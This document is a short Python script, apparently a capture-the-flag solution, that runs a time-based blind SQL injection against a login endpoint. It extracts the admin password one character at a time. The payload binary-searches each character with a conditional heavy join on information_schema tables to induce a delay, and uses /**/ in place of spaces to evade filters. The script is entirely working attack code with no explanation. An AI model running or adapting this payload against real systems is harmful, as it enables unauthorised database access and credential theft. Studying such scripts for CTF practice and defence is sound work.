import requests
import time
url = "http://4.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login"
i = 0
flag = ""
while True :
    i += 1
    head = 32
    tail = 126
    while head < tail :
        mid = head + tail >> 1
        payload = "a' or (if(ascii(substr(password,%d,1))>%d,(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,information_schema.columns/**/B,information_schema.tables/**/C),1))#" % (i,mid)
        data = {"username":"admin" , "password" : payload}   
        start_time = time.time()
        r = requests.post(url,data = data)
        print(data['password'])
        end_time = time.time()
        if end_time - start_time > 3:
            head = mid + 1
        else :
            tail = mid
    if head!=32:
        flag += chr(head)
        print(flag)
    else :
        break